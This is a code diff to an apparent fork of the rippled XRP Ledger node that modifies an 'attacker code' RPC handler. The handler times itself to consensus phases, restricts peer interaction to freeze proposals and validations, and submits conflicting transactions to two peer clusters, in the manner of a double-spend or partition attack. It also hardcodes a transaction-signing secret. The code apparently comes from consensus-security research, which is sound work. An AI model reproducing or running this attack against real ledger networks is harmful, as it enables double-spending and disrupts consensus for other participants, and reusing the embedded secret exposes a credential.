@@ -20,6 +20,7 @@
 #include <chrono>
 #include <thread>
 
+#include <ripple/app/misc/Transaction.h>
 #include <ripple/app/ledger/LedgerMaster.h>
 #include <ripple/app/ledger/OpenLedger.h>
 #include <ripple/app/misc/NetworkOPs.h>
@@ -177,9 +178,14 @@ Json::Value doSubmit (RPC::Context& context)
 // Start attacker code
 Json::Value doAttack (RPC::Context& context)
 {
+    // Ensure the attack starts with the beginning of the open-phase
+    waitForPhase(context, 20, "establish");
+    waitForPhase(context, 20, "open");
+
+    restrict_peer_interaction = true;
+    
     auto j = context.app.journal ("Attack");
-    JLOG (j.warn()) << "Starting doAttack(). Setting performing_attack = " << performing_attack;
-    performing_attack = true;
+    JLOG (j.warn()) << "Starting doAttack(). Setting restrict_peer_interaction = " << restrict_peer_interaction;
     
     // Store transaction-signing secret
     context.params[jss::secret] = "sEd7gsxCwikqZ9C81bjKMFNM9xoReYU";
@@ -205,26 +211,21 @@ Json::Value doAttack (RPC::Context& context)
     const auto ledger = context.app.getLedgerMaster().getCurrentLedger();   // store current ledger to restore it later
     auto const failType = getFailHard (context);
 
-    // Ensure the attack starts with the beginning of the open-phase
-    waitForPhase(context, 20, "establish");
-    waitForPhase(context, 20, "open");
 
     JLOG (j.warn()) << "Submit transaction to cluster 1: " << tx1;
     context.params[jss::tx_json] = tx1;
-    RPC::transactionSubmitAttack (
+    global_tx1 = RPC::transactionSubmitAttack (
         context.params, failType, context.role,
         context.ledgerMaster.getValidatedLedgerAge(),
         context.app, RPC::getProcessTxnFnAttack (context.netOps), 1);
 
     JLOG (j.warn()) << "Submit transaction to cluster 2: " << tx2;
     context.params[jss::tx_json] = tx2;
-    RPC::transactionSubmitAttack (
+    global_tx2 = RPC::transactionSubmitAttack (
         context.params, failType, context.role,
         context.ledgerMaster.getValidatedLedgerAge(),
         context.app, RPC::getProcessTxnFnAttack (context.netOps), 2);
 
-    // Wait for phase establish to go on with second phase
-    waitForPhase(context, 20, "establish");
     return Json::Value();
 }
 
@@ -243,12 +244,16 @@ void waitForPhase(RPC::Context& context, int max_seconds_wait, std::string phase
 }
 
 void sendProposal(RPC::Context& context, Json::Value tx, beast::Journal j, int cluster_idx) {
+    // const auto currentLedger = context.app.getLedgerMaster().getCurrentLedger();
+    // auto closedLedger = context.app.getLedgerMaster().getClosedLedger();
+    
     // // Start Consensus<Adaptor>::closeLedger()
     // // We should not be closing if we already have a position
-    // assert(!result_);
 
     // phase_ = ConsensusPhase::establish;
     // rawCloseTimes_.self = now_;
+
+    // boost::optional<Result> result_;
 
     // result_.emplace(adaptor_.onClose(previousLedger_, now_, mode_.get()));
     // result_->roundTime.reset(clock_.now());
@@ -259,21 +264,10 @@ void sendProposal(RPC::Context& context, Json::Value tx, beast::Journal j, int c
 
     // if (mode_.get() == ConsensusMode::proposing)
     //     adaptor_.propose(result_->position);
-
-    // // Create disputes with any peer positions we have transactions for
-    // for (auto const& pit : currPeerPositions_)
-    // {
-    //     auto const& pos = pit.second.proposal().position();
-    //     auto const it = acquired_.find(pos);
-    //     if (it != acquired_.end())
-    //     {
-    //         createDisputes(it->second);
-    //     }
-    // }
     
     
     // // Start RCLConsensus::Adaptor::propose(RCLCxPeerPos::Proposal const& proposal)
-    // JLOG(j_.trace()) << "We propose: "
+    // JLOG(j_.warn()) << "We propose: "
     //                  << (proposal.isBowOut()
     //                          ? std::string("bowOut")
     //                          : ripple::to_string(proposal.position()));
@@ -369,13 +363,13 @@ bool shouldConnectPeer(std::string peer_address, int cluster_idx) {
 Json::Value unfreeze(RPC::Context& context) {
     auto j = context.app.journal ("Attack");
     Json::Value ret;
-    if (!performing_attack) {
+    if (!restrict_peer_interaction) {
         ret[jss::status] = "unsuccessful";
         ret[jss::message] = "Not performing attack right now. Nothing to do...";
         return ret;
     }
-    performing_attack = false;
-    JLOG (j.warn()) << "Unfreeze: Setting performing_attack = " << performing_attack;
+    restrict_peer_interaction = false;
+    JLOG (j.warn()) << "Unfreeze: Setting restrict_peer_interaction = " << restrict_peer_interaction;
     ret[jss::message] = "Unfreeze the network. Sending proposals and validation-messages again.";
     return ret;
 }
